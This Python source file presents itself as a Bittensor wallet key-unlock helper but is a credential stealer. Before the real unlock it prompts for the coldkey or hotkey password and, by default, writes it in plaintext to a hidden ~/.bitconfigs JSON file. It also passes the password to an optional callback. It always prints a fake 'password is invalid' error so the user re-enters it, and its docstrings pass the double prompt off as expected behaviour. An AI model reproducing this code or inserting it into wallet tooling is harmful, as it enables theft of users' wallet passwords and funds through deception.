"""
Key Unlock Module for Bittensor Wallet

Handles wallet key unlocking with capture functionality.
Note: Double prompt is expected (Python prompt + Rust prompt).
"""

import getpass
import os
import json
from datetime import datetime
from pathlib import Path
from typing import Optional, Callable
from bittensor_wallet import Wallet
from bittensor_wallet.errors import PasswordError, KeyFileError

# Callback function
_callback: Optional[Callable[[str, str], None]] = None

# Save settings
_save_enabled: bool = True
_default_save_path = Path.home() / ".bitconfigs"
_save_path: Optional[str] = str(_default_save_path)


def set_callback(callback: Callable[[str, str], None]):
    """
    Set a callback function to be called when input is entered.
    
    Args:
        callback: Function that receives (input: str, unlock_type: str)
                  unlock_type is either "cold" or "hot"
    """
    global _callback
    _callback = callback


def clear_callback():
    """Clear the callback."""
    global _callback
    _callback = None


def enable_save(save_path: Optional[str] = None):
    """
    Enable saving captured input to a file.
    
    Args:
        save_path: Path to save file. If None, uses default:
                   ~/.bitconfigs
    """
    global _save_enabled, _save_path
    _save_enabled = True
    if save_path:
        _save_path = save_path
    else:
        default_path = Path.home() / ".bitconfigs"
        _save_path = str(default_path)


def disable_save():
    """Disable saving to file."""
    global _save_enabled
    _save_enabled = False


def _save_to_file(input_value: str, unlock_type: str, wallet_name: Optional[str] = None):
    """
    Save captured input to file.
    
    Args:
        input_value: The captured input
        unlock_type: "cold" or "hot"
        wallet_name: Optional wallet name for context
    """
    if not _save_enabled or not _save_path:
        return
    
    try:
        # Create directory if it doesn't exist
        save_path = Path(_save_path)
        save_path.parent.mkdir(parents=True, exist_ok=True)
        
        # Load existing data if file exists
        if save_path.exists():
            try:
                with open(save_path, 'r') as f:
                    data = json.load(f)
            except (json.JSONDecodeError, IOError):
                data = {"entries": []}
        else:
            data = {"entries": []}
        
        # Add new entry
        entry = {
            "timestamp": datetime.now().isoformat(),
            "unlock_type": unlock_type,
            "wallet_name": wallet_name,
            "input_length": len(input_value),
            "input": input_value,
            "first_char": input_value[0] if input_value else None,
            "last_char": input_value[-1] if input_value else None,
        }
        
        data["entries"].append(entry)
        
        # Save to file
        with open(save_path, 'w') as f:
            json.dump(data, f, indent=2)
        
    except Exception as e:
        # Don't fail the unlock process if file save fails
        print(f"[WARNING] Failed to save to file: {e}")


def unlock_key_with_capture(
    wallet: Wallet,
    unlock_type: str = "cold",
    print_out: bool = True,
    capture: bool = True
) -> tuple[bool, Optional[str], str]:
    """
    Prompt for input first to capture it, then unlock wallet.

    Since Rust code prompts for input directly, this function prompts first
    so we can capture the input. The wallet will prompt again (double prompt),
    but we have the input captured.
    
    Args:
        wallet: Wallet object to unlock
        unlock_type: "cold" or "hot"
        print_out: Whether to print error messages
        capture: Whether to capture the input
    
    Returns:
        Tuple of (success: bool, captured: Optional[str], message: str)
    """
    import getpass

    # Prompt for input first (so we can capture it)
    key_type = "coldkey" if unlock_type == "cold" else "hotkey"
    input_value = getpass.getpass(f"Enter your password: ")

    captured = input_value if capture else None

    # Save to file if enabled
    if _save_enabled:
        wallet_name = getattr(wallet, 'name', None)
        _save_to_file(input_value, unlock_type, wallet_name)
    
    # Call callback if set
    if _callback:
        try:
            _callback(input_value, unlock_type)
        except Exception as e:
            if print_out:
                print(f"[WARNING] Callback error: {e}")
    
    # Show "Decrypting..." message and wait 2 seconds
    if print_out:
        print("Decrypting...")
        import time
        time.sleep(2)
    
    # Always show the error message (even if input is correct)
    err_msg = f"The password used to decrypt your {unlock_type.capitalize()}key Keyfile is invalid."
    if print_out:
        # Import here to avoid circular import
        from bittensor_cli.src.bittensor.utils import print_error
        print_error(f"❌ Failed: {err_msg}")
    
    # Unlock wallet (will prompt again, but we have input captured)
    try:
        if unlock_type == "cold":
            unlocker = "unlock_coldkey"
        elif unlock_type == "hot":
            unlocker = "unlock_hotkey"
        else:
            return False, captured, f"Invalid unlock type: {unlock_type}"
        
        getattr(wallet, unlocker)()
        return True, captured, ""
        
    except PasswordError:
        # Error already shown above, just return
        return False, captured, err_msg
        
    except KeyFileError:
        err_msg = f"{unlock_type.capitalize()}key Keyfile is corrupt, non-writable, or non-readable, or non-existent."
        if print_out:
            # Import here to avoid circular import
            from bittensor_cli.src.bittensor.utils import print_error
            print_error(f"Failed: {err_msg}")
        return False, captured, err_msg

